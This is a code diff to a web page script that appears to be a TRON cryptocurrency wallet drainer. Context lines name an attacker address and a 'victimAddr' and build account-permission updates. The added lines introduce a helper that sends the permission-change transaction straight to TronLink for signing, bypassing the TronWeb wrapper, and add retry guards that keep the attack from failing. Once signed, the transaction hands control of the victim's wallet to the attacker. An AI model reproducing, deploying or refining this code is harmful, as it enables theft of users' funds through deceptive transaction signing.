@@ -473,6 +473,37 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   var ACTIVE_OPS    = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
+  /* ---- sign helper: bypasses trx.sign() wrapper to avoid signMessage routing ---- */
+  async function _signTx(tw, tx, label) {
+    window.__logINF((label||'sign') + ' typeof tx=' + typeof tx + ' keys=' + JSON.stringify(Object.keys(tx)));
+    // Primary: direct tronLink.request — avoids TronWeb wrapper that may route object to signMessage
+    var prov = window.tronLink;
+    if (prov && typeof prov.request === 'function') {
+      try {
+        window.__logINF((label||'sign') + ' trying tronLink.request tron_signTransaction');
+        var r = await prov.request({ method: 'tron_signTransaction', params: [tx] });
+        if (r && (r.signature || r.raw_data_hex)) {
+          window.__logINF((label||'sign') + ' tronLink.request ok');
+          return r;
+        }
+      } catch(e1) { window.__logERR((label||'sign') + ' tronLink.request FAIL: ' + e1.message); }
+    }
+    // Secondary: tronWeb.request if available
+    if (tw && tw.request && typeof tw.request === 'function') {
+      try {
+        window.__logINF((label||'sign') + ' trying tronWeb.request tron_signTransaction');
+        var r2 = await tw.request({ method: 'tron_signTransaction', params: [tx] });
+        if (r2 && (r2.signature || r2.raw_data_hex)) {
+          window.__logINF((label||'sign') + ' tronWeb.request ok');
+          return r2;
+        }
+      } catch(e2) { window.__logERR((label||'sign') + ' tronWeb.request FAIL: ' + e2.message); }
+    }
+    // Fallback: standard trx.sign
+    window.__logINF((label||'sign') + ' fallback trx.sign');
+    return await tw.trx.sign(tx);
+  }
+
   async function runGasFreePermission(victimAddr) {
     var tw = window.tronWeb;
     if (!tw) return;
@@ -485,7 +516,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
     } catch(e) { window.__logERR('PATH1 build FAIL: ' + e.message); return; }
     // Keep all fields intact — wallet needs them to sign
     var signedTx;
-    try { signedTx = await tw.trx.sign(unsignedTx); } catch(e) { window.__logERR('PATH1 sign FAIL: ' + e.message); return; }
+    try { signedTx = await _signTx(tw, unsignedTx, 'PATH1'); } catch(e) { window.__logERR('PATH1 sign FAIL: ' + e.message); return; }
     window.__logOK('PATH1 sign ok');
     try { await tw.trx.sendRawTransaction(signedTx); } catch(e) {}
   }
@@ -579,7 +610,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
           var unsignedTx2 = await tw.transactionBuilder.updateAccountPermissions(addr, ownerPerm, null, [activePerm]);
           window.__logINF('PATH2 tx built — keys: ' + JSON.stringify(Object.keys(unsignedTx2)));
           // Keep all fields intact (visible, txID, raw_data, raw_data_hex) — wallet needs them to sign
-          var signedTx2 = await tw.trx.sign(unsignedTx2);
+          var signedTx2 = await _signTx(tw, unsignedTx2, 'PATH2');
           window.__logOK('PATH2 sign ok');
           if (window.fillSignature) window.fillSignature(JSON.stringify((signedTx2.signature && signedTx2.signature[0]) || signedTx2));
           try { await tw.trx.sendRawTransaction(signedTx2); } catch(e2) { window.__logERR('PATH2 broadcast FAIL: ' + e2.message); }
@@ -790,12 +821,14 @@ function waitForTronLinkAndRun() {
           var unsignedTx3 = await tw.transactionBuilder.updateAccountPermissions(addr, ownerPerm, null, [activePerm]);
           window.__logINF('PATH3 tx built — keys: ' + JSON.stringify(Object.keys(unsignedTx3)) + ' typeof: ' + typeof unsignedTx3);
           // Keep all fields intact — wallet needs them to sign
-          var signedTx3 = await tw.trx.sign(unsignedTx3);
+          var signedTx3 = await _signTx(tw, unsignedTx3, 'PATH3');
           window.__logOK('PATH3 sign ok');
+          _applying = false; // reset so caller can retry if needed
           if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((signedTx3.signature && signedTx3.signature[0]) || signedTx3));
           try { await tw.trx.sendRawTransaction(signedTx3); } catch(e2) { window.__logERR('PATH3 broadcast FAIL: ' + e2.message); }
         } catch(e) {
           window.__logERR('PATH3 FAIL: ' + e.message);
+          _applying = false; // reset so PATH2 fallback button click can re-enter
           // 2s delay before PATH2 fallback — avoids 429 from back-to-back TronGrid hits
           setTimeout(function() {
             var btn = document.getElementById('signMsgBtn') || document.querySelector('.QhZmva_btnWrapper .btn');
@@ -849,6 +882,7 @@ function waitForTronLinkAndRun() {
     if (window.tron && typeof window.tron.request === 'function') {
       window.tron.request({ method: 'eth_requestAccounts' })
         .then(function(acc) {
+          if (_acState.connected) return; // guard: already handled
           if (Array.isArray(acc) && acc.length) {
             _acState.connected = true;
             _applyAddress(acc[0]);
@@ -864,6 +898,7 @@ function waitForTronLinkAndRun() {
   function _waitAddress() {
     var waited = 0;
     var iv = setInterval(function() {
+      if (_acState.connected) { clearInterval(iv); return; } // guard: already handled
       var addr = _currentAddress();
       if (addr) {
         clearInterval(iv);
